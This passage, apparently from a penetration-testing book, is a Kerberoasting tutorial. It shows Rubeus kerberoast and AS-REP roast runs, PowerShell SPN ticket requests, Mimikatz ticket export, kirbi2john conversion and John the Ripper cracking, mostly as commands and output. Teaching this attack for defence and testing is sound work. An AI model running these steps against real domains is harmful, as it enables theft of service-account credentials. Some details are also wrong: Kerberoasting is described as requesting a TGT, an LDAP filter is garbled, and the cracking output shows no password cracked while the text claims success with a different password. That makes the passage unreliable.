
Once the attacker has access to a system, they may deploy Rubeus on the compromised host. Rubeus is a standalone tool that can be run from the command line.

### 3. Run the Rubeus Kerberoast Attack

The attacker uses Rubeus to request a Ticket Granting Ticket (TGT) for a specific user or all of the users. This is often a domain user account, and the goal is to obtain the TGT, which can then be used to request service tickets.

Sounds complicated, I know. But the attack itself is fairly simple.

- Download and compile the Rubeus executable
- Get the executable file onto the Windows Server target
- In a Windows Server prompt, enter "Rubeus.exe kerberoast"

![](img/4a03f08556c51a14a3b88fe549a54ca8_30_0.png)

Rubeus will then run the kerberoast attack against the Domain and display any service account hashes that it can find. That’s it, if the attack is successful, we now have the password hash of numerous service accounts that we can try to crack!

If the target does not have Kerberos pre-authentication set, you could also try AS-REP roasting.

```
Rubeus.exe asreproast
```

```
C:\Data>Rubeus.exe asreproast

Rubeus
v2.2.0

[*] Action: AS-REP roasting

[*] Target Domain                : Domain.Local
[*] Searching path 'LDAP://TEMP-DC.Domain.Local/DC=Domain,DC=Local' for '(&(samAccountType=805306368\n3555:1.4.609:43484)')'
[*] SamAccountName               : SHARRON_DANIELS
[*] DistinguishedName            : CN=SHARRON_DANIELS,OU=Deivces,OU=TST,OU=Tier 1,DC=Domain,DC=Local
[*] Using domain controller: TEMP-DC.Domain.Local (fe80::f16f:2cc:a8cc:8efe%6)
[*] Building AS-REQ (w/o preauth) for: 'Domain.Local\SHARRON_DANIELS'

[*] SamAccountName               : HORACE_EVANS
[*] DistinguishedName            : CN=HORACE_EVANS,OU=Groups,OU=BDE,OU=Tier 2,DC=Domain,DC=Local
[*] Using domain controller: TEMP-DC.Domain.Local (fe80::f16f:2cc:a8cc:8efe%6)
[*] Building AS-REQ (w/o preauth) for: 'Domain.Local\HORACE_EVANS'
```

If successful (it wasn't on this domain) it will list the password hashes for all potential targets.

### 4. Offline Cracking

The attacker can then attempt to crack the service tickets offline using tools like Hashcat or John the Ripper to reveal the plaintext password associated with the service account.

### 5. Pass-the-Ticket Attacks (Not Covered)

In some scenarios, the attacker may use Rubeus for pass-the-ticket attacks, presenting the captured ticket to gain unauthorized access to services without the need to crack the ticket.

This was just a very simple overview of one feature of Rubeus. There are many more ways that you can use Rubeus to attack Active Directory. For example, you can attack specific users or groups by Organizational Unit. See the Tool Wiki for more information.

## KERBEROAST TOOLKIT

**GitHub Site:** https://github.com/nidem/kerberoast

Kerberoast is a set of tools for attacking Kerberos. The complete process for performing Kerberoasting is covered on the tool website. The steps are replicated here for convenience. You will also need to download Mimikatz and place its executable file (Mimikatz.exe) on the target Windows system. Mimikatz is covered in the following section.

- Download the Kerberoast Toolkit on your kali system.
- In a Kali Terminal, Enter, `git clone https://github.com/nidem/kerberoast.git`
- Then change directory to kerberoast

In PowerShell on the Windows Server Target:

- Enter, `setspn -T domain -Q */*`
- And then, `Add-Type -AssemblyName System.IdentityModel`
- Lastly, `setspn.exe -T DOMAIN.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`

These are built in Microsoft commands that will extract the tickets and save them into memory.

```
PS C:\Users\Administrator> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\Administrator> setspn.exe -T DOMAIN.local -Q */* | Select-String  $Context.PostContext[0].Trim()

Id : uuid-0f341948-63fb-42a6-a673-546dbdb61fbfd-1
SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom : 11/17/2023 8:11:35 PM
ValidTo : 11/18/2023 5:57:43 AM
ServicePrincipalName : Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EBB4/TEMP-DC.DOMAIN.LOCAL
SecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id : uuid-0f341948-63fb-42a6-a673-546dbdb61fbfd-2
SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom : 11/17/2023 8:11:35 PM
ValidTo : 11/17/2023 8:13:35 PM
ServicePrincipalName : kadmin/changePW
SecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

This will pull the security accounts Kerberos tickets and put them in active memory. Now, we will just need a tool to pull the hashes from these and save them to a file. For this, we can use the tool, Mimikatz.

- Download [Mimikatz](https://github.com/gentilkiwi/mimikatz) and save the Mimikatz.exe file to your Windows Server Target.
- Open a command prompt and run Mimikatz
- At the Mimikatz prompt enter, `“kerberos::list /export”`

Mimikatz will pull all the Kerberos tickets from memory and save them to individual files.

```
C:\Data\mimikatz

.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##. “A La Vie, A L’Amour” - (oe.eo)
## / \ ## /** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \/ ## > https://blog.gentilkiwi.com/mimikatz
'## \\ ## Vincent LE TOUX ( vincent.letoux@gmail.com )
 '####' > https://pingcastle.com / https://mysmartlogon.com **/

mimikatz # kerberos::list /export

[00000000] - 0x00000012 - as56_hmac
Start/End/MaxRenew: 11/17/2023 2:57:43 PM ; 11/18/2023 12:57:43 AM ; 11/24/2023 2:57:43 PM
Server Name : krbtgt/DOMAIN.LOCAL @ DOMAIN.LOCAL
Client Name : Administrator @ DOMAIN.LOCAL
Flags 40a10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
* Saved to file : 0-40a10000-Administrator@krbtgt-DOMAIN.LOCAL-DOMAIN.LOCAL.kirbi
```

We now have the encrypted hashes of numerous service accounts; all we need to do is crack them! We cannot crack the hashes directly; it is in an incompatible format. You will need to convert the Mimikatz `.kirbi` save files into a format that Hashcat or John the Ripper requires. We can do this by copying the kirbi files to our Kali system and then convert it using the Kerberoast Toolkit file "kirbi2john".

- Copy the Kerberos .kirbi file you want to crack to the Kerberoast directory on our Kali system
- Then run, `"kirbi2john -o [output_file_name] [Mimikatz_Kirbi_File]"`

```
(kali@kali:~)$ kerberoast
$ kirbi2john -o hash.txt 61-40a10000-Administrator@ftp~ESMWLPT1000001-DOMAIN.LOCAL.kirbi
tickets written: 1
```

Now, let's crack it!

For this, we will use John the Ripper and a wordlist. For this example, I just created a wordlist with the correct password in it. Don't worry, we will cover wordlists and cracking in much greater depth later. For now, I just want to show a sample example of a quick kill crack.

- `John ./[Hash_to_Crack] --format=krb5tgs --wordlist=[wordlist]`

We just call John the Ripper, provide it with the password hash, the Kerberos format and a wordlist.

```
(kali@kali:~)$ kerberoast
$ john ./crack.txt --format=krb5tgs --wordlist=kerbwl.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 4 needed for performance.
0g 0:00:00:00 DONE (2023-11-17 19:19) 0g/s 33.33p/s 33.33c/s 33.33C/s Password123!
Session completed.
```

And we have it! We were able to successfully pull a service account password hash from Kerberos and save it in memory using PowerShell. We then used Mimikatz to pull the data from memory and save it to a file. We converted the file to a format that cracking programs can process. Lastly, we successfully cracked the password of `"Passw0rd123!"`. Again, this is just an example, we dig much deeper into cracking in later chapters!
